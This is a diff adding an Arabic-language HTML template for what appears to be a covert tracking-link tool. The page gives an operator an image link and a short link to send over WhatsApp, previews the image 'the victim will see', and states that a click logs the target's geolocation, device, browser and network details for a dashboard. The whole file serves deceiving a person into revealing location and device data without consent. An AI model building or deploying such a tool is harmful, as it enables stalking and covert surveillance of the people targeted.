@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>رابط الصورة - واتساب</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; direction: rtl; text-align: center; padding: 30px; background: #f0f2f5; }
+        .container { max-width: 700px; margin: auto; background: white; padding: 30px; border-radius: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); }
+        .link-box { background: #e8f0fe; padding: 15px; border-radius: 8px; word-break: break-all; margin: 15px 0; }
+        input { width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 8px; font-size: 14px; margin: 10px 0; }
+        button { background: #25D366; color: white; border: none; padding: 12px 30px; border-radius: 8px; font-size: 16px; cursor: pointer; margin: 5px; }
+        button:hover { background: #1ebe5f; }
+        .badge { display: inline-block; background: #ff9800; color: white; padding: 5px 15px; border-radius: 20px; margin-top: 10px; }
+        .img-preview { border: 2px dashed #ccc; padding: 20px; border-radius: 10px; margin: 15px 0; background: #fafafa; }
+        .img-preview img { max-width: 200px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .whatsapp-btn { background: #25D366; padding: 15px 30px; font-size: 18px; border-radius: 50px; display: inline-block; color: white; text-decoration: none; margin: 10px 0; }
+        .whatsapp-btn:hover { background: #1ebe5f; }
+        .note { font-size: 12px; color: #999; margin-top: 20px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>📱 رابط الصورة - للإرسال في واتساب</h1>
+        <p>انسخ الرابط التالي وأرسله في واتساب. عند الضغط على الصورة، سيتم تسجيل جميع المعلومات.</p>
+
+        <div class="link-box">
+            <strong>🖼️ رابط الصورة:</strong><br>
+            <span>{{ image_link }}</span>
+        </div>
+        <input type="text" value="{{ image_link }}" id="imageLink" readonly>
+        <button onclick="copyLink()">📋 نسخ الرابط</button>
+
+        <hr>
+
+        <div class="link-box">
+            <strong>🔗 رابط مختصر:</strong><br>
+            <span>{{ short_link }}</span>
+        </div>
+        <input type="text" value="{{ short_link }}" id="shortLink" readonly>
+        <button onclick="copyShortLink()">📋 نسخ الرابط المختصر</button>
+
+        <hr>
+
+        <div class="img-preview">
+            <strong>معاينة الصورة التي سيراها الضحية:</strong><br>
+            <img src="{{ image_link }}" alt="صورة التتبع">
+            <p style="font-size: 13px; color: #888;">هذه الصورة ستظهر في واتساب، وعند النقر عليها تُسجل الزيارة.</p>
+        </div>
+
+        <a href="https://wa.me/?text={{ image_link|urlencode }}" target="_blank" class="whatsapp-btn">
+            📲 أرسل عبر واتساب الآن
+        </a>
+
+        <br>
+        <a href="/dashboard" target="_blank"><button style="background: #2196F3;">📊 لوحة التحكم</button></a>
+        <p class="badge">معرف الرابط: {{ link_id }}</p>
+        <p class="note">
+            ⚠️ عند إرسال الرابط، واتساب سيعرض الصورة تلقائياً. الضغط على الصورة يسجل الزيارة.<br>
+            يتم جمع: الموقع الجغرافي، معلومات الجهاز، المتصفح، الشبكة، والمزيد.
+        </p>
+    </div>
+
+    <script>
+        function copyLink() {
+            const input = document.getElementById('imageLink');
+            input.select();
+            document.execCommand('copy');
+            alert('تم نسخ رابط الصورة!');
+        }
+        function copyShortLink() {
+            const input = document.getElementById('shortLink');
+            input.select();
+            document.execCommand('copy');
+            alert('تم نسخ الرابط المختصر!');
+        }
+    </script>
+</body>
+</html>
